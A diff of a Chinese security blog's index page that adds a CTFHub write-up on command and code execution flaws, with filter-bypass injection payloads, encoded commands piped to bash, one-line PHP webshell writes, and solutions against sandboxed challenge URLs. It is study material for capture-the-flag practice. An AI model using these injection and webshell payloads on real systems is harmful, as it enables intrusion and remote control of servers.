@@ -7,7 +7,145 @@
     error: 'Copy error',
     noSupport: 'The browser does not support'
   }
-} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">98</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">19</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/03/02/%E5%9C%A8kali-linux%E4%B8%8B%E6%90%AD%E5%BB%BADVWA/">在kali-linux下搭建DVWA</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-02</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/linux/">linux</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/">杂七杂八</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/DVWA/">DVWA</a></span><div class="content"><p>因为平台不同有些操作也有区别，所以今天想要在kali-linux搭建一下DVWA平台，当然还是遇到了一些困难，网上的解决方法也是有好有坏。所以我来总结下：</p>
+} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">99</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">19</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">命令执行/代码执行</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-02</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">web安全漏洞</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctfhub/">ctfhub</a></span><div class="content"><h2 id="一些基本概念"><a href="#一些基本概念" class="headerlink" title="一些基本概念"></a>一些基本概念</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><ul>
+<li><p><strong>command1 &amp; command2 ：</strong></p>
+<p>不管command1执行成功与否，都会执行command2</p>
+</li>
+<li><p><strong>command1 &amp;&amp; command2 ：</strong></p>
+<p>先执行command1执行成功后才会执行command2</p>
+</li>
+<li><p><strong>command1 | command2 ：</strong></p>
+<p>只执行command2（将上一个命令的输出作为下一个命令的输入）</p>
+</li>
+<li><p><strong>command1 || command2 ：</strong></p>
+<p>command1执行失败，再执行command2(若command1执行成功，就不再执行command2)</p>
+</li>
+</ul>
+<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><ul>
+<li><p>;   前面的执行完执行后面的    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1;whoami</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>|   管道符，显示后面的执行结果  ，（将上一个命令的输出作为下一个命令的输入）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1|whoami</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>||  当前面的执行出错时执行后面的  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 1||whoami</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>&amp;  前面的语句为假则直接执行后面的,前面可真可假           </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1&amp;whoami</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真   </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<blockquote>
+<p><strong>常用url编码</strong> ：<br>%20 = 空格<br>%5c = <br>%26 = &amp;<br>%7c = |</p>
+<p>%0a=换行</p>
+<p>%3b=;</p>
+</blockquote>
+<h2 id="代码执行漏洞和命令执行漏洞"><a href="#代码执行漏洞和命令执行漏洞" class="headerlink" title="代码执行漏洞和命令执行漏洞"></a>代码执行漏洞和命令执行漏洞</h2><h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><p>类似ecal(),assert()函数</p>
+<h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><p>类似exec(),system()</p>
+<h2 id="几种bypass"><a href="#几种bypass" class="headerlink" title="几种bypass"></a>几种bypass</h2><h3 id="基本的注入"><a href="#基本的注入" class="headerlink" title="基本的注入"></a>基本的注入</h3><ul>
+<li><pre><code>127.0.0.1;ls
+127.0.0.1;cat xxx.txt
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>
+127.0.0.1;echo &quot;&lt;?php @eval(\$_POST[&apos;key&apos;]);?&gt;&quot; &gt;xxx.php
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  \$用来转义，有时echo会用到-e参数</span><br><span class="line"></span><br><span class="line">  [有关-e、-n参数。](https:&#x2F;&#x2F;www.cnblogs.com&#x2F;karl-python&#x2F;p&#x2F;9261920.html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### base64编码</span><br><span class="line"></span><br><span class="line">有时有些内容无法回显,我们可以base64编码它们</span><br><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>
+1;cat xxx.txt &amp; base64
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  &amp;的作用是把前面输出的结果作为输入进行后面的操作</span><br><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>
+1;base64 xxx.txt
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 过滤cat</span><br><span class="line"></span><br><span class="line">- 反斜杠 ： 例如</span><br></pre></td></tr></table></figure>
+ca\t fl\ag.php
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 连接符： 例如</span><br></pre></td></tr></table></figure>
+ca&apos;&apos;t fla&apos;&apos;g.txt
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 过滤空格</span><br><span class="line"></span><br><span class="line">在 bash 下, 可以用以下字符代替空格：</span><br></pre></td></tr></table></figure>
+&lt;,&lt;&gt;,%20(space),%09(tab),$IFS$9, ${IFS},$IFS 等
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 过滤目录分隔符[&#x2F;]</span><br><span class="line"></span><br><span class="line">可以使用cd命令直接进入那个目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 花括号</span><br><span class="line"></span><br><span class="line">&#123;cat,flag&#125; 逗号代替空格</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; ### 黑名单绕过</span><br><span class="line">&gt;</span><br><span class="line">&gt; 拼接绕过:相当于ls</span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+&gt; $a=l;$b=s;$a$b
+&gt; <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">编码绕过：</span><br><span class="line"></span><br><span class="line">**base64：**</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;bash</span><br><span class="line">echo MTIzCg&#x3D;&#x3D;|base64 -d 其将会打印123</span><br><span class="line">echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
+&gt;
+&gt; **hex:**
+&gt;
+&gt; <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"636174202f666c6167"</span> | xxd -r -p|bash ==&gt;cat /flag</span><br></pre></td></tr></table></figure>
+&gt;
+&gt; **oct：**
+&gt;
+&gt; <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">printf</span> <span class="string">"\154\163"</span>) ==&gt;ls</span><br><span class="line">$(<span class="built_in">printf</span> <span class="string">"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"</span>) ==&gt;cat /flag</span><br><span class="line">&#123;<span class="built_in">printf</span>,<span class="string">"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"</span>&#125;|\<span class="variable">$0</span> ==&gt;cat /flag</span><br><span class="line"><span class="comment">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST['c']);?&gt;</span></span><br><span class="line"><span class="variable">$&#123;printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"&#125;</span> &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>
+
+
+</code></pre></li>
+</ul>
+<h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><p>长度限制可以用文件构造的方式来绕过。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linux下可以用 1&gt;a创建文件名为a的空文件</span><br><span class="line">ls -t&gt;<span class="built_in">test</span>则会将目录按时间排序后写进<span class="built_in">test</span>文件中</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h3><p>命令替代，大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。类似的还有$(command).</p>
+<blockquote>
+<p>cat$IFS<code>ls</code>    //带反引号</p>
+</blockquote>
+<blockquote>
+<p>cat$IFS$(ls)</p>
+</blockquote>
+<h3 id="综合过滤练习1"><a href="#综合过滤练习1" class="headerlink" title="综合过滤练习1"></a>综合过滤练习1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$res = <span class="keyword">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]) &amp;&amp; $_GET[<span class="string">'ip'</span>]) &#123;</span><br><span class="line">    $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">    $m = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">"/(\||&amp;|;| |\/|cat|flag|ctfhub)/"</span>, $ip, $m)) &#123;</span><br><span class="line">        $cmd = <span class="string">"ping -c 4 &#123;$ip&#125;"</span>;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到,过滤掉了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|   &amp;   ;   &#x2F;   cat   flag   ctfhub</span><br></pre></td></tr></table></figure>
+
+<p>好像大部分有用的都被过滤掉了,这时我们就需要换一种思路,我们使用url编码来解决[<strong>接下来所有的payload都是在hackbar上输入,直接在ping里输入没有用</strong>]</p>
+<h4 id="url编码表"><a href="#url编码表" class="headerlink" title="url编码表"></a>url编码表</h4><p><img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.png" alt="1">)<img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/2.png" alt="2"></p>
+<p>其中本题用到的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%0a   换行[输入下一条命令,类似于;]</span><br><span class="line">%09   TAB[占位符,替代那些不确定字符的位置]</span><br><span class="line">%3b   ;</span><br><span class="line">%5c   \[cat被过滤了,要加\干扰]</span><br></pre></td></tr></table></figure>
+
+<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-9777b80d72305d7f.sandbox.ctfhub.com:10080&#x2F;?ip&#x3D;1%0als#</span><br></pre></td></tr></table></figure>
+
+<p>得到:</p>
+<p><img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/3.png" alt="3"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-9777b80d72305d7f.sandbox.ctfhub.com:10080&#x2F;?ip&#x3D;1%0als%09*_is_here#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/4.png" alt="4"></p>
+<blockquote>
+<p>其中%09*的意思:</p>
+<p>%09作为占位符,去正则匹配被过滤的flag, *代表一个或多个字符[flag就是四个字符]</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-9777b80d72305d7f.sandbox.ctfhub.com:10080&#x2F;?ip&#x3D;1%0acd%09*_is_here%0aca%5ct%09*_5861249545945.php#</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-9777b80d72305d7f.sandbox.ctfhub.com:10080&#x2F;?ip&#x3D;1%0acd%09*_is_here%0abase64%09*_5861249545945.php#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/5.png" alt="5"></p>
+<p>或者…</p>
+<p>这我是这么想的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;1%0aecho&quot;&lt;?php@eval(\$_POST[&#39;ag&#39;])%3b?&gt;&quot;&gt;123.php#</span><br></pre></td></tr></table></figure>
+
+<p>但是好像并不成功,直接无法写入,然后我尝试者写一些普通文本到123.php或122.txt,写入倒是都可以成功写入,问题就是这些文件打不开???base64编码也没有反应,很迷,但我有招一日一定要注入进去!加油!</p>
+<p><a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">RCE的综合过滤练习</a></p>
+<h3 id="综合过滤练习2"><a href="#综合过滤练习2" class="headerlink" title="综合过滤练习2"></a>综合过滤练习2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your symbol!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/ /"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your space!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/bash/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your bash!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your flag!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;ls</span><br></pre></td></tr></table></figure>
+
+<p>发现：</p>
+<p><img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/l2_1.png" alt="l2_1"></p>
+<p>于是开始实验空格，最后发现$IFS$1可以成功替代空格</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$1index.php</span><br></pre></td></tr></table></figure>
+
+<p>但是还会过滤flag，所有就如下即可获得flag</p>
+<p><strong>方法1（内联）</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$1&#96;ls&#96;</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法2（拼接）</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法3（编码）</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
+
+<p>这个编码的方法还没有看的特别懂。。。测试还存在一些问题</p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/03/02/%E5%9C%A8kali-linux%E4%B8%8B%E6%90%AD%E5%BB%BADVWA/">在kali-linux下搭建DVWA</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-02</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/linux/">linux</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/">杂七杂八</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/DVWA/">DVWA</a></span><div class="content"><p>因为平台不同有些操作也有区别，所以今天想要在kali-linux搭建一下DVWA平台，当然还是遇到了一些困难，网上的解决方法也是有好有坏。所以我来总结下：</p>
 <ol>
 <li><p>解压压缩包到</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure>
@@ -339,51 +477,6 @@
 </li>
 <li></li>
 </ol>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/12/python%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/">python的一些简单方法</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-12</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/python/">python</a></span><div class="content"><h3 id="去除空白"><a href="#去除空白" class="headerlink" title="去除空白"></a>去除空白</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rstrip()   &#x2F;&#x2F;去除尾部空白</span><br><span class="line">lstrip()   &#x2F;&#x2F;去除头部空白</span><br><span class="line">strip()    &#x2F;&#x2F;去除头尾空白</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name.title()   &#x2F;&#x2F;首字母大写</span><br><span class="line">name.upper()   &#x2F;&#x2F;全部大写</span><br><span class="line">name.lower()   &#x2F;&#x2F;全部小写</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="对列表的插入与删除"><a href="#对列表的插入与删除" class="headerlink" title="对列表的插入与删除"></a>对列表的插入与删除</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name.append(&#39;a&#39;)   &#x2F;&#x2F;在列表末尾添加元素a</span><br><span class="line">name.insert(0,&#39;a&#39;) &#x2F;&#x2F;在列表0位置添加元素a</span><br><span class="line">del name[0]        &#x2F;&#x2F;删除列表0位置元素</span><br></pre></td></tr></table></figure>
-
-<h4 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">motorcycles &#x3D; [&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;]  </span><br><span class="line">print(motorcycles) </span><br><span class="line"></span><br><span class="line">popped_motorcycle &#x3D; motorcycles.pop()</span><br><span class="line">print(motorcycles) </span><br><span class="line">print(popped_motorcycle)</span><br></pre></td></tr></table></figure>
-
-<p>结果</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;] </span><br><span class="line">[&#39;honda&#39;, &#39;yamaha&#39;] </span><br><span class="line">suzuki</span><br></pre></td></tr></table></figure>
-
-<p>pop中添加数字即可添加元素到任何位置</p>
